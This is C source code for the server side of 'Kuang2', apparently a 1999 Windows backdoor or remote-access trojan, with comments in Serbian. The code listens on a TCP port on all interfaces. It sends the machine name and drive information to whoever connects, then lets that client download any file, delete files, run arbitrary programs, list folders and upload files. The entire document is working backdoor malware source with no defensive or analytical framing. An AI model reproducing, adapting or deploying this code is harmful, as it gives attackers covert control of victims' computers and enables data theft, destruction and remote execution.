/***[ThuNderSoft]*************************************************************
								 KUANG2: server
								   ver: 0.15
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.15 (06-may-1999): konaan oblik
// ver 0.10 (30-mar-1999): born code

#include <windows.h>
#include <winsock.h>
#include <win95e.h>
#include <strmem.h>
#include "kuang2.h"

extern HWND hWnd;
extern char Kuang2_class[];
extern DWORD drives;

DWORD WINAPI ServerThread (LPVOID);

extern char temppath[];
SOCKET listen_socket;

/*
	StartServer
	-----------
  ş Poetak rada servera. Kreira se socket, postavlja se asinhrono
	obave„tavanje i ukljuuje se listen mod */

int StartServer(void)
{
	WSADATA W;
	SOCKADDR_IN sa_server;

	// zahteva se winsock v1.1
	if (WSAStartup (0x101, &W)) return 2;

	// obri„i request listu
	ClearRequests();

	// kreiraj stream socket
	listen_socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (listen_socket==INVALID_SOCKET) return 1;

	// postavi asinhrono obave„tavanje
	if (WSAAsyncSelect(listen_socket, hWnd, UM_ASYNC, FD_ACCEPT) == INVALID_SOCKET) {
		closesocket(listen_socket);
		return 2;
	}

	// popuni strukturu
	sa_server.sin_family=AF_INET;			// Internet familija
	sa_server.sin_addr.s_addr=INADDR_ANY;	// sve adrese
	sa_server.sin_port=htons(KUANG2_PORT);	// port

	// bindovanje
	if (bind(listen_socket, (struct sockaddr*)&sa_server, sizeof(sa_server)) == SOCKET_ERROR) {
		closesocket(listen_socket);
		return 3;
	}

	// namesti socket u listen mod
	if (listen(listen_socket, MAXCONN) == SOCKET_ERROR) {
		closesocket(listen_socket);
		return 4;
	}

	return 0;
}

/*
	OnAccept
	--------
  ş dobijena je asinhrona poruka za prijem konekcije */

void OnAccept(SOCKET socket)
{
	SOCKADDR_IN sock_addr;
	SOCKET peer_socket;
	DWORD ThreadID;
	int nlen;

	// prihvata se konekcija
	nlen=sizeof(sock_addr);
	peer_socket=accept(listen_socket, (struct sockaddr*)&sock_addr, &nlen);
	if (peer_socket==SOCKET_ERROR) return;

	// preuzmi novi request
	nlen=NewRequest();
	if (nlen==NOMOREREQUEST) {			// ima previ„e konektovanih klijenata
		unsigned int err=K2_ERROR;
		send(peer_socket, (char *) &err, 4, 0);
		closesocket(peer_socket);
		return;
	}

	// zapamti socket
	request[nlen].socket=peer_socket;

	// startuj thread i zapamti handle na njega
	request[nlen].thread=CreateThread(NULL, 0, ServerThread, (LPVOID) &(request[nlen].socket), 0, &ThreadID);

	return;
}


/*
	OnQuitclient
	------------
  ş dobijena je poruka za zavr„avanje klijenta */

void OnQuitclient(SOCKET socket)
{
	int i;

	// preuzmi index u Request listi trenutne konekcije
	i=GetRequest(socket);
	if (i==BADREQUEST) return;

	// zatvori socket
	closesocket(socket);

	// zatvori thread
	CloseHandle(request[i].thread);

	// obri„i zauzeto polje u Request listi
	request[i].socket=-1;

	return;
}


/*
	ServerThread
	------------
  ş Svaka konekcija koja se zakai na server koristi ovaj thread. */

DWORD WINAPI ServerThread (LPVOID targ)
{
	char buffer[BUFFER_SIZE];
	pMessage k2_msg = (pMessage) buffer;
	SOCKET msgsock=*(SOCKET*)targ;
	DWORD temp;
	unsigned int bytes_recieved;
#define		bytes_sent		bytes_recieved
	unsigned int fajlsize, tosend;
#define		downloaded		tosend
	HANDLE fajl;
	char filelist[MAX_PATH+1];

	fajlsize=0;
	// ovo je kulturan server - „alje pozdravnu poruku pri konekciji
	k2_msg->command=K2_HELO;					// komanda prepoznavanja
	k2_msg->param=drives;						// informacije o fixnim diskovima
	temp=BUFFER_SIZE-8;
	GetComputerName(&(k2_msg->sdata), &temp);	// ime kompjutera na kome je server
	send(msgsock, buffer, BUFFER_SIZE, 0);

	// petlja servera: prima poruke klijenta i odgovara na njih
	while (1) {

		// primi poruku
		bytes_recieved=recv(msgsock, buffer, BUFFER_SIZE, 0);	// prihvati poruku od klijenta
		if (!bytes_recieved) k2_msg->command=K2_QUIT;			// ako je klijent oti„ao
		if ((bytes_recieved==SOCKET_ERROR)) {					// ako je nastupila gre„ka
			if (WSAGetLastError()!=WSAEWOULDBLOCK) k2_msg->command=K2_QUIT; // i to fatalna
				else continue;									// ne fatalna gre„ka - wsaewouldblock
		}

		// parse commands
		switch (k2_msg->command) {

			case K2_DOWNLOAD_FILE:
				// faza #3 - zatvori handle i javi da je OK
				if (k2_msg->param==3) {
					CloseHandle(fajl);
					fajlsize=0;
					k2_msg->command=K2_DONE;
					send(msgsock, buffer, 4, 0);
					break;
				}
				// faza #2 - zapoinje burst prenos fajla
				if (k2_msg->param==2) {
					while (fajlsize) {
						tosend=BUFFER_SIZE;
						if (tosend>fajlsize) tosend=fajlsize;
						SetFilePointer(fajl, -fajlsize, NULL, FILE_END);
						ReadFile(fajl, buffer, tosend, &temp, NULL);
						bytes_sent=send(msgsock, buffer, tosend, 0);	// po„alji 1KB fajla
						if (bytes_sent==SOCKET_ERROR) {
							if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
								else bytes_sent=0;
						}
						fajlsize-=(bytes_sent);
					}
					break;
				}
				// faza #1 - inicijalizacija downloada
				fajl=CreateFile(k2_msg->bdata, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
				fajlsize=GetFileSize(fajl, NULL);
				if ((fajlsize==0xFFFFFFFF) || (fajl==INVALID_HANDLE_VALUE)) {
					k2_msg->command=K2_ERROR;		// neka gre„ka pri radu sa fajlom
					send(msgsock, buffer, 4, 0);
					break;
				}
				k2_msg->command=K2_DONE;			// fajl spreman za download
				k2_msg->param=fajlsize;				// veliina fajla
				send(msgsock, buffer, 8, 0);
				break;


			case K2_QUIT:
				SendMessage(hWnd, UM_QUITCLIENT, (WPARAM) msgsock, 0);
				return 0;


			case K2_DELETE_FILE:
				if (DeleteFile(k2_msg->bdata)) k2_msg->command=K2_DONE;
					else k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				break;


			case K2_RUN_FILE: {
				STARTUPINFO si;
				PROCESS_INFORMATION pi;

				si.cb=sizeof(STARTUPINFO);
				si.cbReserved2=0;
				si.lpReserved=si.lpReserved2=NULL;
				si.lpTitle=si.lpDesktop=(LPTSTR)NULL;
				si.dwFlags=STARTF_FORCEOFFFEEDBACK;
				if (CreateProcess(NULL, k2_msg->bdata, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &si, &pi)) {
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
					k2_msg->command=K2_DONE;
				} else k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				}
				break;


			case K2_FOLDER_INFO: {
				WIN32_FIND_DATA FileData;
				HANDLE hSearch;
				BOOL fFinished=FALSE;

				// prvo kreira jedinstveno ime fajla za prenos FOLDER_LIST
				GetTempFileName(temppath, Kuang2_class, 0, filelist);

				fajl=CreateFile(filelist, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
				hSearch=FindFirstFile(k2_msg->bdata, &FileData);	// tra‚i...
				if ((fajl==INVALID_HANDLE_VALUE) || (hSearch==INVALID_HANDLE_VALUE)) {	// ako ne na”e prvi fajl ili fajl nije otvoren
					k2_msg->command=K2_ERROR;
					CloseHandle(fajl); DeleteFile(filelist);
					send(msgsock, buffer, 4, 0);
					break;
				}

				while (!fFinished) {	// vrti za sve fajlove, 'buffer' je slobodan

					if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						wsprintf(buffer, "*%s", FileData.cFileName);
					else {
						temp=FileData.nFileSizeLow >> 10;		// veliina fajla u KB
						if (FileData.nFileSizeLow) temp++;		// da 0 fajl bude zaista 0
						if (FileData.nFileSizeHigh) temp=-1;	// ako je fajl jako veliki
						wsprintf(buffer, "%s <%1luk>", FileData.cFileName, temp);
					}

					// upi„i string u fajl, zajedno sa NULL terminatorom na kraju
					WriteFile(fajl, buffer, strlengthF(buffer)+1, &temp, NULL);

					// uzima slede†i fajl
					if (!FindNextFile(hSearch, &FileData)) {
						if (GetLastError()==ERROR_NO_MORE_FILES) {	// do„li smo na kraj - nema vi„e fajlova
							k2_msg->command=K2_DONE;				// po„alji oznaku za kraj
							strcopyF(k2_msg->bdata, filelist);		// i ime fajla za download
						} else k2_msg->command=K2_ERROR;			// nastupila je gre„ka

						FindClose(hSearch);		// zatvori pretragu
						CloseHandle(fajl);		// zatvori fajl
						if (k2_msg->command==K2_ERROR) DeleteFile(filelist);
						send(msgsock, buffer, BUFFER_SIZE, 0);
						fFinished=TRUE;
					}
				}
				}
				break;


			case K2_UPLOAD_FILE:
				// faza #1
				fajlsize=k2_msg->param;
				fajl=CreateFile(k2_msg->sdata, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
				if (fajl==INVALID_HANDLE_VALUE) {
					k2_msg->command=K2_ERROR;		// nastupila je gre„ka
					send(msgsock, buffer, 4, 0);
					break;
				}
				k2_msg->command=K2_DONE;			// sve je ok.
				send(msgsock, buffer, 4, 0);

				// faza #2
				downloaded=0;
				while (downloaded!=fajlsize) {
					bytes_recieved=recv(msgsock, buffer, BUFFER_SIZE, 0);	// primi deo fajla
					if (bytes_recieved==SOCKET_ERROR) {
						if (WSAGetLastError()!=WSAEWOULDBLOCK) break;
						bytes_recieved=0;
						continue;
					}
					WriteFile(fajl, buffer, bytes_recieved, &temp, NULL);
					downloaded+=bytes_recieved;
				}

				// faza #3
				k2_msg->command=K2_DONE;			// sve je ok.
				send(msgsock, buffer, 4, 0);
				CloseHandle(fajl);
				break;


			default:
				k2_msg->command=K2_ERROR;
				send(msgsock, buffer, 4, 0);
				break;
		}
	}

	return 0;
}
